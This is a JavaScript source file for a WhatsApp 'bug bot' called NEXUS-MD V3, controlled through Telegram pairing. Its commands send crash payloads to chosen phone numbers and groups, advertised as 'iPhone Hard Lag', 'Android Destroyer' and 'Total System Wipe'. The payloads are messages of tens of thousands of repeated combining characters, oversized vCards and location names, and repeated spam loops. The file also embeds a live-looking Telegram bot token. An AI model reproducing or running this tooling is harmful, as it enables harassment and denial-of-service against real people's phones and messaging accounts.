const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    DisconnectReason, 
    delay,
    Browsers
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require('pino');
const express = require('express');

// --- ⚙️ CONFIGURATION ---
const TG_TOKEN = '8745872876:AAEyEHrpuYeyP94PRcYlTXSkVjv-vMjKhf8';
const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;

let botConfig = {
    botName: "NEXUS-MD V3 ELITE",
    owner: "94767475809", 
    prefix: ".",
    isPublic: false 
};

app.get('/', (req, res) => res.send('Nexus Elite System Online! ☠️'));
app.listen(PORT, () => console.log(`Dashboard Active on ${PORT}`));

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        logger: pino({ level: 'silent' }),
        // --- 🛠️ PAIRING FIX: අලුත්ම BROWSER AGENT එක ---
        browser: Browsers.macOS("Desktop"), 
        printQRInTerminal: false,
        syncFullHistory: false
    });

    // --- 🤖 TELEGRAM PAIRING (FIXED) ---
    tgBot.on('message', async (msg) => {
        const text = msg.text;
        if (text === '/start') {
            return tgBot.sendMessage(msg.chat.id, "☠️ *NEXUS-MD V3 BUG SYSTEM*\n\nPairing Code එක ලබා ගැනීමට WhatsApp අංකය එවන්න.\n*(Ex: 94767475809)*", { parse_mode: 'Markdown' });
        }
        if (text && /^\d+$/.test(text) && text.length > 9) {
            try {
                tgBot.sendMessage(msg.chat.id, "⏳ *සකසමින් පවතී...*");
                let code = await sock.requestPairingCode(text.replace(/[^0-9]/g, ''));
                tgBot.sendMessage(msg.chat.id, `🔥 *YOUR CODE:* \`${code}\``, { parse_mode: 'Markdown' });
            } catch (e) {
                tgBot.sendMessage(msg.chat.id, "❌ *Error!* Restart Bot and Try Again.");
            }
        }
    });

    // --- 📩 WHATSAPP BUG HANDLER ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message) return;
            const from = mek.key.remoteJid;
            const sender = mek.key.participant || mek.key.remoteJid;
            const isOwner = sender.includes(botConfig.owner) || mek.key.fromMe;
            
            if (!isOwner) return; 

            const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
            if (!body.startsWith(botConfig.prefix)) return;

            const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
            const text = body.trim().split(/ +/).slice(1).join(" ");
            const target = text + "@s.whatsapp.net";

            // --- 🦠 THE DEADLY PAYLOADS ---
            const bug1 = "☠️" + "ꦿ".repeat(45000); 
            const bug2 = "🔥" + "᥋".repeat(50000); 
            const bug3 = "❄️" + "꠵".repeat(55000); 

            switch (command) {
                case 'menu':
                case 'bug':
                    const menu = `╭───〔 *NEXUS-MD V3* 〕───┈
│
│ 🦠 *ELITE BUG SYSTEM (9 MODES)*
│
├ ☠️ *1. .ios1* [num] - iPhone Hard Lag
├ 🔥 *2. .ios2* [num] - iPhone UI Freeze
├ 💀 *3. .kill* [num] - Android Destroyer
├ ❄️ *4. .freeze* [num] - System Lag
├ 📍 *5. .loc* [num] - Location Bug
├ 📇 *6. .vcard* [num] - Contact Crash
├ 🌀 *7. .group* [jid] - Group Destroyer
├ 🧨 *8. .bomb* [num] - Spam Bug
├ 🌌 *9. .the_end* [num] - Total System Wipe
│
╰─────────────┈
 👑 *DEV:* SASIYA MD`;

                    await sock.sendMessage(from, { 
                        text: menu,
                        contextInfo: { 
                            externalAdReply: { 
                                title: "NEXUS-MD ULTIMATE BUG BOT",
                                body: "iPhone & Android Destroyer Active",
                                mediaType: 1,
                                thumbnailUrl: "https://telegra.ph/file/a8a183d25667e41793741.jpg", 
                            }
                        }
                    }, { quoted: mek });
                    break;

                case 'ios1':
                case 'ios2':
                    if (!text) return;
                    for(let i=0; i<12; i++) {
                        await sock.sendMessage(target, { text: bug2 + "".repeat(30000) });
                        await delay(400);
                    }
                    await sock.sendMessage(from, { text: "💀 iPhone Target Is Dead!" });
                    break;

                case 'kill':
                case 'freeze':
                    if (!text) return;
                    await sock.sendMessage(target, { text: bug1 + bug3 });
                    break;

                case 'vcard':
                    const vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:Nexus Virus\nEND:VCARD'.repeat(250);
                    await sock.sendMessage(target, { contacts: { displayName: 'Nexus-MD', contacts: [{ vcard }] } });
                    break;

                case 'loc':
                    await sock.sendMessage(target, { location: { degreesLatitude: 37, degreesLongitude: -122, name: "NEXUS-" + "X".repeat(35000) } });
                    break;

                case 'group':
                    if (!text) return;
                    for(let i=0; i<10; i++) {
                        await sock.sendMessage(text, { text: bug1 + bug2 + bug3 });
                    }
                    break;

                case 'bomb':
                    for(let i=0; i<20; i++) {
                        await sock.sendMessage(target, { text: "🔥 SPAM 🔥\n" + "҈".repeat(10000) });
                    }
                    break;

                case 'the_end':
                    if (!text) return;
                    await sock.sendMessage(from, { text: "🌑 *THE END SYSTEM DEPLOYING...*" });
                    for(let i=0; i<15; i++) {
                        await sock.sendMessage(target, { text: bug1 + bug2 + bug3 });
                        await delay(300);
                    }
                    await sock.sendMessage(from, { text: "💀 *TARGET DESTROYED!*" });
                    break;
            }
        } catch (e) { console.log(e); }
    });

    sock.ev.on('connection.update', (up) => {
        if (up.connection === 'close') startNexus();
        else if (up.connection === 'open') console.log('✅ ELITE BUG BOT READY!');
    });
    sock.ev.on('creds.update', saveCreds);
}

startNexus();
